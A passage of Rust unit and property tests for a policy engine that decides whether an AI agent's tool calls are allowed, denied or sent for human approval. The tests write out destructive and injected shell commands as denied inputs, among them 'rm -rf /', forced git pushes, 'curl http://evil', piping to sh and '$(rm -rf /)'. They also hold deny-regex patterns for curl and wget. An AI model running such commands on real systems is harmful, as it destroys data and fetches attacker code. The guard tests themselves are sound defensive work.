        assert!(matches!(
            bash("git push --force origin main"),
            Verdict::Deny { .. }
        ));
        assert!(matches!(
            bash("git push -f origin main"),
            Verdict::Deny { .. }
        ));
        assert!(matches!(
            bash("git push origin main --force-with-lease"),
            Verdict::Deny { .. }
        ));
        assert!(matches!(bash("rm -rf /"), Verdict::Deny { .. }));
        assert!(matches!(bash("rm -rf /*"), Verdict::Deny { .. }));
        assert!(matches!(bash("rm -r -f /"), Verdict::Deny { .. }));
        // Risky-but-legitimate: pause for a human (governance-e2e relies on this).
        assert!(matches!(
            bash("git push origin main"),
            Verdict::RequireApproval { .. }
        ));
        assert!(matches!(
            bash("pip install requests"),
            Verdict::RequireApproval { .. }
        ));
        assert!(matches!(
            bash("rm -rf ./build"),
            Verdict::RequireApproval { .. }
        ));
        // Non-shell anchors governance-e2e also relies on.
        assert_eq!(
            p.evaluate(
                &req("Read", json!({"file_path": "/workspace/x"})),
                Autonomy::Supervised
            )
            .effective,
            Verdict::Allow
        );
        assert!(matches!(
            p.evaluate(&req("WebFetch", json!({})), Autonomy::Supervised)
                .effective,
            Verdict::Deny { .. }
        ));
        // §10 #3 budget decision, pinned (rationale in the YAML comments).
        assert_eq!(p.budgets.max_wall_clock_secs, Some(1800));
        assert_eq!(p.budgets.max_tokens, Some(1_000_000));
        assert_eq!(p.budgets.max_cost_usd, Some(2.5));
        assert_eq!(p.budgets.max_tool_calls, Some(100));
    }

    #[test]
    fn autonomy_summary_of_the_seed_policy() {
        let yaml = include_str!("../../../policies/default.yaml");
        let p = Policy::parse_yaml(yaml).expect("seed policy parses");
        let s = p.autonomy_summary();
        assert!(s.permitted);
        assert_eq!(s.default_fallback, AutonomousFallback::Deny);
        // The seed policy carries no rule-level on_autonomous overrides.
        assert_eq!(s.allow_overrides, 0);
        assert_eq!(s.deny_overrides, 0);
    }

    /// Only rules that can actually REACH RequireApproval may be counted, via all
    /// THREE routes in `apply_rule`. The seed policy's Bash rule pairs
    /// `action: allow` with `shell.on_no_match: approve`, and its Edit/Write rule
    /// pairs `action: allow` with a `paths.allow` tree (out-of-tree paths hit a
    /// hardcoded Approve) — a naive `action == Approve` test would MISS an
    /// on_autonomous added to either and undercount in the dangerous direction.
    /// Conversely, `shell` short-circuits `paths`, so a rule carrying both must be
    /// judged by `shell` alone or we overcount.
    #[test]
    fn autonomy_summary_counts_only_reachable_overrides() {
        let yaml = r#"
name: t
autonomy: { permitted: true, on_approval_rule: deny }
tools:
  # reachable via shell.on_no_match -> COUNTED
  - match: ["Bash"]
    action: allow
    shell: { on_no_match: approve }
    on_autonomous: allow
  # reachable via action -> COUNTED
  - match: ["mcp__*"]
    action: approve
    on_autonomous: allow
  # dead config: unconditional allow can never require approval -> NOT counted
  - match: ["Read"]
    action: allow
    on_autonomous: allow
  # dead config: unconditional deny -> NOT counted
  - match: ["WebFetch"]
    action: deny
    on_autonomous: deny
  # reachable via paths.allow escalation (apply_rule hardcodes Approve) -> COUNTED
  - match: ["Write"]
    action: allow
    paths: { allow: ["/workspace/**"] }
    on_autonomous: allow
  # shell short-circuits apply_rule, so paths is dead here; on_no_match is
  # allow-not-approve and action is allow -> NOT counted
  - match: ["BashOutput"]
    action: allow
    shell: { on_no_match: allow }
    paths: { allow: ["/workspace/**"] }
    on_autonomous: allow
"#;
        let p = Policy::parse_yaml(yaml).expect("parses");
        let s = p.autonomy_summary();
        assert_eq!(
            s.allow_overrides, 3,
            "Bash (shell on_no_match) + mcp__* (action) + Write (paths.allow escalation); \
             BashOutput's paths is dead behind its shell short-circuit"
        );
        assert_eq!(
            s.deny_overrides, 0,
            "the deny override sits on an unreachable rule"
        );
    }

    #[test]
    fn read_only_tier_permits_reading_only() {
        let allow = |tool: &str, input: Value| {
            assert_eq!(
                read_only_denial(&req(tool, input.clone())),
                None,
                "expected {tool} {input} to be read-safe"
            );
        };
        let deny = |tool: &str, input: Value| {
            assert!(
                read_only_denial(&req(tool, input.clone())).is_some(),
                "expected {tool} {input} to be denied"
            );
        };
        // Reading and reviewing: yes.
        allow("Read", json!({"file_path": "/workspace/repo/a.py"}));
        allow("Glob", json!({"pattern": "**/*.rs"}));
        allow("Grep", json!({"pattern": "fn main"}));
        allow("LS", json!({"path": "/workspace"}));
        allow("NotebookRead", json!({"notebook_path": "x.ipynb"}));
        allow("Bash", json!({"command": "git diff HEAD~1"}));
        allow("Bash", json!({"command": "cat src/lib.rs"}));
        allow("Bash", json!({"command": "git log --oneline -5"}));
        // Writes, egress, secrets, execution: no — regardless of policy.
        deny("Edit", json!({"file_path": "/workspace/repo/a.py"}));
        deny("Write", json!({"file_path": "/workspace/x"}));
        deny("NotebookEdit", json!({"notebook_path": "x.ipynb"}));
        deny("WebFetch", json!({"url": "https://x"}));
        deny("WebSearch", json!({}));
        deny("mcp__github__create_issue", json!({}));
        deny("SomeNewTool", json!({}));
        deny("Bash", json!({"command": "git push origin main"}));
        deny("Bash", json!({"command": "rm -rf /"}));
        deny("Bash", json!({"command": "pytest -x"}));
        deny("Bash", json!({"command": "curl http://evil"}));
        // Compound/injected commands never ride an allowed prefix.
        deny("Bash", json!({"command": "cat a.txt; rm -rf /"}));
        deny("Bash", json!({"command": "cat a.txt && curl http://evil"}));
        deny("Bash", json!({"command": "cat a.txt | sh"}));
        deny("Bash", json!({"command": "cat $(rm -rf /)"}));
        deny("Bash", json!({"command": "cat a.txt > /etc/passwd"}));
        deny("Bash", json!({"command": "git diff `curl evil`"}));
        // Token boundary: "git statusx" is not "git status".
        deny("Bash", json!({"command": "git statusx"}));
        deny("Bash", json!({"command": ""}));
    }

    /// The 0026 fold turns a per-tool override into a HEAD rule. Where such a
    /// head rule sits ahead of a conditional rule matching the same tool,
    /// `validate()` must ACCEPT it (the pre-fold check refused the override
    /// shape, not the rule shape) and first-match-wins must let it decide —
    /// exactly the precedence the override had. Editing it away is now a
    /// legitimate, versioned, revertible rule edit (design §4.3).
    #[test]
    fn a_head_rule_ahead_of_a_conditional_rule_validates_and_wins() {
        let yaml = r#"
name: t
tools:
  - match: ["Bash"]
    action: allow
  - match: ["Bash"]
    action: approve
    shell:
      deny_regex: ["curl .* \\| sh"]
"#;
        let p = Policy::parse_yaml(yaml).expect("a head rule over a conditional rule is valid");
        let out = p.evaluate(
            &req("Bash", json!({"command": "curl evil | sh"})),
            Autonomy::Supervised,
        );
        assert_eq!(out.effective, Verdict::Allow);
        assert_eq!(out.matched_rule, Some(0));
    }

    /// A matrix-authored (folded) head rule is a REAL rule: the matrix reports
    /// it as `Unconditional { rule: Some(0) }`, never a distinct status — the
    /// `Overridden` variant is gone and nothing constructs it (design §4.3).
    #[test]
    fn a_matrix_authored_head_rule_resolves_as_unconditional_rule_zero() {
        let yaml = r#"
name: t
defaults: { tool_action: approve }
tools:
  - match: ["mcp__cloudflare__kv_list"]
    action: allow
  - match: ["mcp__*"]
    action: approve
"#;
        let p = Policy::parse_yaml(yaml).expect("parses");
        let m: std::collections::HashMap<String, ToolStatus> = p
            .tool_matrix(&["mcp__cloudflare__kv_list".to_string()])
            .into_iter()
            .collect();
        assert_eq!(
            m["mcp__cloudflare__kv_list"],
            ToolStatus::Unconditional {
                action: RuleAction::Allow,
                rule: Some(0)
            }
        );
    }

    /// Historical RunSpec snapshots (pre-0026) carry a `managed_overrides` key
    /// and their in-flight runs must keep EXACTLY the semantics they froze —
    /// while `sessions.run_spec` stays byte-identical. Deserialization folds
    /// the key into head rules (the 0026 transform), so the override still
    /// wins over the rules below it, and re-serialization emits a post-fold
    /// document with no legacy key.
    #[test]
    fn stored_managed_overrides_fold_into_head_rules_on_read() {
        let p: Policy = serde_json::from_value(json!({
            "name": "t",
            "defaults": { "tool_action": "approve" },
            "tools": [{ "match": ["SomeTool"], "action": "deny" }],
            "managed_overrides": [{ "tool": "SomeTool", "action": "allow" }],
        }))
        .expect("pre-0026 snapshots must keep deserializing");
        let out = p.evaluate(&req("SomeTool", json!({})), Autonomy::Supervised);
        assert_eq!(
            out.effective,
            Verdict::Allow,
            "the frozen override must keep beating the rules below it"
        );
        assert_eq!(
            out.matched_rule,
            Some(0),
            "the fold made it a REAL head rule"
        );
        let round_tripped = serde_json::to_value(&p).expect("serializes");
        assert!(
            round_tripped.get("managed_overrides").is_none(),
            "serialization must emit the post-fold canonical document"
        );
        assert_eq!(round_tripped["tools"][0]["match"], json!(["SomeTool"]));
    }

    /// Unknown keys stay IGNORED on the lenient path — an old blob with keys
    /// this build has never heard of must still deserialize.
    #[test]
    fn lenient_deserialization_ignores_unknown_keys() {
        let p: Policy = serde_json::from_value(json!({
            "name": "t",
            "tools": [],
            "some_future_field": {"x": 1},
        }))
        .expect("stored blobs must survive unknown keys");
        assert_eq!(p.name, "t");
    }

    /// The AUTHORING path is strict at every level: a typo'd field must be a
    /// refusal naming the key, never a silently-dropped weakening.
    #[test]
    fn parse_strict_refuses_unknown_fields_at_every_level() {
        let ok = Policy::parse_strict(json!({
            "name": "t",
            "defaults": { "tool_action": "deny" },
            "tools": [{ "match": ["Bash"], "action": "allow",
                        "shell": { "allow_prefixes": ["ls"], "on_no_match": "approve" } }],
        }))
        .expect("a well-formed draft parses");
        assert_eq!(ok.defaults.tool_action, RuleAction::Deny);

        // Top level, nested rule, nested constraint — each refusal names the key.
        for (draft, key) in [
            (
                json!({ "name": "t", "paths_deny": ["**/.env"] }),
                "paths_deny",
            ),
            (
                json!({ "name": "t",
                        "tools": [{ "match": ["Edit"], "action": "allow",
                                    "path": { "deny": ["**/.env"] } }] }),
                "path",
            ),
            (
                json!({ "name": "t",
                        "tools": [{ "match": ["Edit"], "action": "allow",
                                    "paths": { "deny": ["**/.env"], "denied": [] } }] }),
                "denied",
            ),
            // The legacy override key is an authoring refusal too: drafts
            // cannot smuggle the retired mechanism back in.
            (
                json!({ "name": "t",
                        "managed_overrides": [{ "tool": "Bash", "action": "allow" }] }),
                "managed_overrides",
            ),
            (
                json!({ "name": "t",
                        "tools": [{ "match": ["Bash"], "action": "allow",
                                    "shell": { "allow_prefix": ["ls"] } }] }),
                "allow_prefix",
            ),
            (
                json!({ "name": "t", "defaults": { "tool_actions": "deny" } }),
                "tool_actions",
            ),
            (
                json!({ "name": "t", "egress": { "modes": "none" } }),
                "modes",
            ),
            (
                json!({ "name": "t", "budgets": { "max_token": 1 } }),
                "max_token",
            ),
            (
                json!({ "name": "t", "approvals": { "ttl_secs": 5 } }),
                "ttl_secs",
            ),
            // The misspelling that would silently leave `permitted: true`.
            (
                json!({ "name": "t", "autonomy": { "permited": false } }),
                "permited",
            ),
        ] {
            let err = Policy::parse_strict(draft).expect_err("unknown field must refuse");
            assert!(err.contains(key), "error must name {key:?}: {err}");
        }
    }

    /// parse_strict runs validate(): structurally-known-but-invalid content
    /// (a bad regex) is refused with the validator's message.
    #[test]
    fn parse_strict_runs_validate() {
        let err = Policy::parse_strict(json!({
            "name": "t",
            "tools": [{ "match": ["Bash"], "action": "allow",
                        "shell": { "deny_regex": ["("] } }],
        }))
        .expect_err("a bad regex must refuse");
        assert!(err.contains("deny_regex"), "{err}");
    }

    #[test]
    fn bad_yaml_is_rejected() {
        assert!(Policy::parse_yaml("name: x\ntools:\n  - match: []\n    action: allow").is_err());
        assert!(Policy::parse_yaml(
            "name: x\ntools:\n  - match: [Bash]\n    action: allow\n    shell:\n      deny_regex: [\"(\"]"
        )
        .is_err());
    }

    /// The seed policy is the fixture because it exercises every case.
    #[test]
    fn tool_matrix_of_the_seed_policy() {
        let yaml = include_str!("../../../policies/default.yaml");
        let p = Policy::parse_yaml(yaml).expect("seed policy parses");
        let names: Vec<String> = [
            "Read",
            "Edit",
            "Bash",
            "WebFetch",
            "mcp__cloudflare__kv_list",
            "Frobnicate",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        let m: std::collections::HashMap<String, ToolStatus> =
            p.tool_matrix(&names).into_iter().collect();

        // Unconditional rules are safe to control.
        assert!(matches!(
            m["Read"],
            ToolStatus::Unconditional {
                action: RuleAction::Allow,
                ..
            }
        ));
        assert!(matches!(
            m["WebFetch"],
            ToolStatus::Unconditional {
                action: RuleAction::Deny,
                ..
            }
        ));
        assert!(matches!(
            m["mcp__cloudflare__kv_list"],
            ToolStatus::Unconditional {
                action: RuleAction::Approve,
                ..
            }
        ));

        // Conditional rules must NOT be flattened: "Edit -> Allow" is false (it is
        // allow-in-/workspace, deny-for-.env, ask-elsewhere).
        match &m["Edit"] {
            ToolStatus::Conditional { constraints, .. } => {
                assert!(constraints
                    .paths_allow
                    .iter()
                    .any(|g| g.contains("/workspace")));
                assert!(constraints.paths_deny.iter().any(|g| g.contains(".env")));
                // The third clause. `apply_rule` hardcodes an escalation for a
                // path outside `paths_allow`; the UI must be able to SAY that
                // without re-deriving the constant in TypeScript.
                assert_eq!(constraints.paths_on_no_match, Some(RuleAction::Approve));
            }
            other => panic!("Edit must be Conditional, got {other:?}"),
        }
        match &m["Bash"] {
            ToolStatus::Conditional { constraints, .. } => {
                assert_eq!(constraints.shell_on_no_match, Some(RuleAction::Approve));
            }
            other => panic!("Bash must be Conditional (shell), got {other:?}"),
        }

        // Nothing matched -> defaults.tool_action.
        assert!(matches!(
            m["Frobnicate"],
            ToolStatus::Default {
                action: RuleAction::Approve
            }
        ));
    }

    /// `paths_on_no_match` describes a guard that only EXISTS when `allow` is
    /// non-empty. A deny-only rule skips it and falls through to `rule.action`,
    /// so reporting an escalation there would invent a clause the engine never
    /// runs. Pinned against `evaluate` so the summary can't drift from the gate.
    #[test]
    fn deny_only_paths_report_no_escalation_because_the_guard_is_skipped() {
        let yaml = r#"
name: t
defaults: { tool_action: approve }
tools:
  - match: ["Write"]
    action: allow
    paths:
      deny: ["**/.env"]
"#;
        let p = Policy::parse_yaml(yaml).expect("parses");
        let m: std::collections::HashMap<String, ToolStatus> =
            p.tool_matrix(&["Write".to_string()]).into_iter().collect();
        match &m["Write"] {
            ToolStatus::Conditional { constraints, .. } => {
                assert!(constraints.paths_allow.is_empty());
                assert_eq!(constraints.paths_deny, vec!["**/.env".to_string()]);
                assert_eq!(constraints.paths_on_no_match, None);
            }
            other => panic!("Write must be Conditional (paths), got {other:?}"),
        }
        // Why None is the truth: an arbitrary out-of-tree path is ALLOWED here
        // (rule.action), never escalated — there is no "asks elsewhere" clause.
        assert_eq!(
            p.evaluate(
                &req("Write", json!({ "file_path": "/etc/anywhere.txt" })),
                Autonomy::Supervised
            )
            .effective,
            Verdict::Allow
        );
    }
}

/// Property tests: the security invariants the example-based tests above pin
/// point-wise, asserted over generated policies and adversarial inputs.
#[cfg(test)]
mod proptests {
    use super::*;
    use crate::spec::Autonomy;
    use proptest::prelude::*;
    use serde_json::json;

    fn arb_action() -> impl Strategy<Value = RuleAction> {
        prop_oneof![
            Just(RuleAction::Allow),
            Just(RuleAction::Approve),
            Just(RuleAction::Deny),
        ]
    }

    fn arb_fallback() -> impl Strategy<Value = AutonomousFallback> {
        prop_oneof![
            Just(AutonomousFallback::Deny),
            Just(AutonomousFallback::Allow)
        ]
    }

    /// Tool names as agents actually send them, plus arbitrary unknown ones.
    fn arb_tool() -> impl Strategy<Value = String> {
        prop_oneof![
            prop::sample::select(vec![
                "Read",
                "Glob",
                "Grep",
                "LS",
                "Bash",
                "Edit",
                "Write",
                "MultiEdit",
                "WebFetch",
                "mcp__kb__search",
                "mcp__ws__file_count",
            ])
            .prop_map(str::to_string),
            "[A-Za-z][A-Za-z0-9_]{0,16}",
        ]
    }

    /// Match patterns: exact names, `prefix*` wildcards, or the universal `*`.
    fn arb_pattern() -> impl Strategy<Value = String> {
        prop_oneof![
            arb_tool(),
            "[A-Za-z][A-Za-z0-9_]{0,6}".prop_map(|p| format!("{p}*")),
            Just("*".to_string()),
        ]
    }

    fn arb_shell() -> impl Strategy<Value = ShellRules> {
        (
            prop::collection::vec(
                prop::sample::select(vec!["ls", "git status", "pytest", "python3", "rm"])
                    .prop_map(str::to_string),
                0..3,
            ),
            prop::collection::vec(
                prop::sample::select(vec![r"rm\s+-rf\s+/", r"\bcurl\b", r"\bwget\b"])
                    .prop_map(str::to_string),
                0..3,
            ),
            arb_action(),
        )
            .prop_map(|(allow_prefixes, deny_regex, on_no_match)| ShellRules {
                allow_prefixes,
                deny_regex,
                on_no_match,
            })
    }

    fn arb_rule() -> impl Strategy<Value = ToolRule> {
        (
            prop::collection::vec(arb_pattern(), 1..3),
            arb_action(),
            prop::option::of(arb_shell()),
            prop::bool::ANY,
            prop::option::of(arb_fallback()),
        )
            .prop_map(|(m, action, shell, with_paths, on_autonomous)| ToolRule {
                r#match: m,
                action,
                risk: None,
                paths: with_paths.then(|| PathRules {
                    allow: vec!["/workspace/**".into()],
                    deny: vec!["**/.env".into()],
                }),
                shell,
                on_autonomous,
                approval_ttl_secs: None,
                approval_scope: None,
            })
    }

    fn arb_policy() -> impl Strategy<Value = Policy> {
        (
            prop::collection::vec(arb_rule(), 0..5),
            arb_action(),
            arb_fallback(),
            // Randomized so the fold-equivalence property really covers the
            // POLICY-DEFAULT ttl/scope an override's approval verdict carries
            // (defaults alone would only ever prove 600s/once).
            1..3600u64,
            prop_oneof![Just(ApprovalScope::Once), Just(ApprovalScope::Session)],
        )
            .prop_map(
                |(tools, default_action, on_approval_rule, ttl, scope)| Policy {
                    name: "prop".into(),
                    defaults: PolicyDefaults {
                        tool_action: default_action,
                    },
                    egress: Egress::default(),
                    budgets: crate::spec::Budgets::default(),
                    approvals: ApprovalSettings {
                        default_ttl_secs: ttl,
                        scope,
                        timeout_action: TimeoutAction::Deny,
                    },
                    autonomy: AutonomySettings {
                        permitted: true,
                        on_approval_rule,
                    },
                    tools,
                },
            )
    }

    /// Arbitrary printable inputs in the shapes the gate actually receives.
    fn arb_input() -> impl Strategy<Value = serde_json::Value> {
        prop_oneof![
            "[ -~]{0,40}".prop_map(|c| json!({ "command": c })),
            "[ -~]{0,40}".prop_map(|p| json!({ "file_path": p })),
            Just(json!({})),
        ]
    }

    fn req(tool: String, input: serde_json::Value) -> ToolCallRequest {
        ToolCallRequest { tool, input }
    }

    proptest! {
        /// Invariant #6 (autonomous ≠ ungoverned, but also ≠ stuck): an
        /// autonomous evaluation NEVER surfaces RequireApproval — the engine
        /// rewrites it before it can leave, so an unattended run cannot hang
        /// waiting for a human that isn't there.
        #[test]
        fn autonomous_never_requires_approval(
            p in arb_policy(), tool in arb_tool(), input in arb_input()
        ) {
            let out = p.evaluate(&req(tool, input), Autonomy::Autonomous);
            let requires_approval = matches!(out.effective, Verdict::RequireApproval { .. });
            prop_assert!(!requires_approval);
        }

        /// Autonomy resolution touches EXACTLY the approval verdicts: Allow
        /// and Deny pass through untouched, approvals are rewritten with the
        /// flag set, and the supervised verdict is always preserved as
        /// `original` (both are ledgered — the audit trail sees the truth).
        #[test]
        fn autonomy_rewrites_exactly_the_approvals(
            p in arb_policy(), tool in arb_tool(), input in arb_input()
        ) {
            let supervised = p.evaluate(&req(tool.clone(), input.clone()), Autonomy::Supervised);
            let autonomous = p.evaluate(&req(tool, input), Autonomy::Autonomous);
            prop_assert_eq!(&autonomous.original, &supervised.effective);
            match supervised.effective {
                Verdict::RequireApproval { .. } => {
                    prop_assert!(autonomous.autonomy_rewritten);
                    let resolved = matches!(
                        autonomous.effective,
                        Verdict::Allow | Verdict::Deny { .. }
                    );
                    prop_assert!(resolved);
                }
                other => {
                    prop_assert!(!autonomous.autonomy_rewritten);
                    prop_assert_eq!(autonomous.effective, other);
                }
            }
        }

        /// The read-only trust tier fails safe against injection: ANY shell
        /// metacharacter anywhere in the command defeats prefix reasoning and
        /// must deny, no matter what the command otherwise looks like.
        #[test]
        fn read_only_tier_denies_any_metacharacter(
            prefix in "[ -~]{0,20}", suffix in "[ -~]{0,20}",
            meta in prop::sample::select(vec![';', '|', '&', '`', '$', '(', ')', '<', '>', '\n'])
        ) {
            let cmd = format!("{prefix}{meta}{suffix}");
            let r = req("Bash".into(), json!({ "command": cmd }));
            prop_assert!(read_only_denial(&r).is_some());
        }

        /// The read-only tier is an ALLOWLIST: any tool not explicitly listed
        /// (and not Bash, which has its own prefix path) is denied — new or
        /// unknown tools are read-only-unsafe by default.
        #[test]
        fn read_only_tier_denies_unlisted_tools(tool in "[A-Za-z][A-Za-z0-9_]{0,16}") {
            prop_assume!(tool != "Bash" && !READ_SAFE_TOOLS.contains(&tool.as_str()));
            let denied = read_only_denial(&req(tool, json!({}))).is_some();
            prop_assert!(denied);
        }

        /// Shell prefix matching is token-bounded: `p` matches itself and
        /// `p <anything>`, but never `p` glued to more word characters —
        /// "git status" must not cover "git statusx".
        #[test]
        fn prefix_match_is_token_bounded(
            p in "[a-z]{1,8}( [a-z]{1,8})?", glued in "[a-zA-Z0-9_-]{1,8}", rest in "[ -~]{0,20}"
        ) {
            let exact = prefix_matches(&p, &p);
            let spaced = prefix_matches(&p, &format!("{p} {rest}"));
            let glued_on = prefix_matches(&p, &format!("{p}{glued}"));
            prop_assert!(exact);
            prop_assert!(spaced);
            prop_assert!(!glued_on);
        }

        /// First match wins: a deny rule prepended for the exact tool always
        /// decides, regardless of everything below it.
        #[test]
        fn first_matching_rule_decides(
            p in arb_policy(), tool in arb_tool(), input in arb_input()
        ) {
            let mut p2 = p;
            p2.tools.insert(0, ToolRule {
                r#match: vec![tool.clone()],
                action: RuleAction::Deny,
                risk: None,
                paths: None,
                shell: None,
                on_autonomous: None,
                approval_ttl_secs: None,
                approval_scope: None,
            });
            let out = p2.evaluate(&req(tool, input), Autonomy::Supervised);
            let denied = matches!(out.effective, Verdict::Deny { .. });
            prop_assert!(denied);
            prop_assert_eq!(out.matched_rule, Some(0));
        }
    }

    // ─── The 0026 override fold, pinned (design §6) ─────────────────────────
    //
    // Migration 0026 folds every `managed_overrides` entry into a HEAD rule
    // (`{match: [tool], action}`), prepended in stored order. The property
    // below is the fold's correctness proof: for any policy, any valid
    // override set, and any request, the PRE-FOLD engine (overrides consulted
    // first, exact-name, policy-default ttl/scope/autonomy-fallback — mirrored
    // by `evaluate_with_overrides` because the branch itself is deleted) and
    // the POST-FOLD engine agree verdict for verdict, in both autonomy modes.
    // The SQL in 0026 is the mechanism; this test is the guarantee.

    /// Valid override sets under the RETIRED validate() contract: exact names
    /// (no wildcards), unique per tool.
    fn arb_overrides() -> impl Strategy<Value = Vec<(String, RuleAction)>> {
        prop::collection::vec((arb_tool(), arb_action()), 0..4).prop_map(|v| {
            let mut seen = std::collections::HashSet::new();
            v.into_iter()
                .filter(|(t, _)| !t.contains('*') && seen.insert(t.clone()))
                .collect()
        })
    }

    /// The 0026 fold, mirrored in Rust: overrides become head rules in stored
    /// order, ahead of the authored rules.
    fn fold_overrides(overrides: &[(String, RuleAction)], p: &Policy) -> Policy {
        let mut folded = p.clone();
        let head = overrides.iter().map(|(tool, action)| ToolRule {
            r#match: vec![tool.clone()],
            action: *action,
            risk: None,
            paths: None,
            shell: None,
            on_autonomous: None,
            approval_ttl_secs: None,
            approval_scope: None,
        });
        folded.tools = head.chain(p.tools.iter().cloned()).collect();
        folded
    }

    /// The PRE-FOLD engine, mirrored: an exact-name override wins over the
    /// rules with the POLICY's default ttl/scope, and — because the override
    /// replaced the rule (`matched_rule = None`) — the POLICY's autonomy
    /// fallback, never a rule's `on_autonomous`.
    fn evaluate_with_overrides(
        p: &Policy,
        overrides: &[(String, RuleAction)],
        req: &ToolCallRequest,
        autonomy: Autonomy,
    ) -> Verdict {
        let Some((_, action)) = overrides.iter().find(|(t, _)| *t == req.tool) else {
            return p.evaluate(req, autonomy).effective;
        };
        let original = match action {
            RuleAction::Allow => Verdict::Allow,
            RuleAction::Deny => Verdict::Deny {
                reason: "denied by policy".into(),
            },
            RuleAction::Approve => Verdict::RequireApproval {
                risk: None,
                ttl_secs: p.approvals.default_ttl_secs,
                scope: p.approvals.scope,
                scope_key: req.tool.clone(),
            },
        };
        if autonomy == Autonomy::Autonomous {
            if let Verdict::RequireApproval { .. } = original {
                return match p.autonomy.on_approval_rule {
                    AutonomousFallback::Allow => Verdict::Allow,
                    AutonomousFallback::Deny => Verdict::Deny {
                        reason:
                            "requires human approval; run is autonomous (policy fallback: deny)"
                                .into(),
                    },
                };
            }
        }
        original
    }

    proptest! {
        #[test]
        fn override_fold_preserves_every_verdict(
            p in arb_policy(),
            ov in arb_overrides(),
            free_tool in arb_tool(),
            pick: prop::sample::Index,
            hit_override in prop::bool::ANY,
            input in arb_input(),
            autonomous in prop::bool::ANY,
        ) {
            // Half the requests target an override's exact tool so the folded
            // head rules are actually exercised, not just walked past.
            let tool = if hit_override && !ov.is_empty() {
                ov[pick.index(ov.len())].0.clone()
            } else {
                free_tool
            };
            let autonomy = if autonomous { Autonomy::Autonomous } else { Autonomy::Supervised };
            let pre = evaluate_with_overrides(&p, &ov, &req(tool.clone(), input.clone()), autonomy);
            let folded = fold_overrides(&ov, &p);
            let post = folded
                .evaluate(&req(tool.clone(), input.clone()), autonomy)
                .effective;
            prop_assert_eq!(&pre, &post);

            // Third leg: the LENIENT DESERIALIZER applies the identical fold.
            // A pre-0026 blob (policy + managed_overrides key) deserializes to
            // exactly the folded document — this is what keeps an in-flight
            // run's frozen snapshot governing with the semantics it froze.
            let mut legacy = serde_json::to_value(&p).unwrap();
            legacy["managed_overrides"] = serde_json::Value::Array(
                ov.iter()
                    .map(|(tool, action)| {
                        serde_json::json!({ "tool": tool, "action": action })
                    })
                    .collect(),
            );
            let deserialized: Policy = serde_json::from_value(legacy).unwrap();
            prop_assert_eq!(
                serde_json::to_value(&deserialized).unwrap(),
                serde_json::to_value(&folded).unwrap()
            );
        }
    }
}
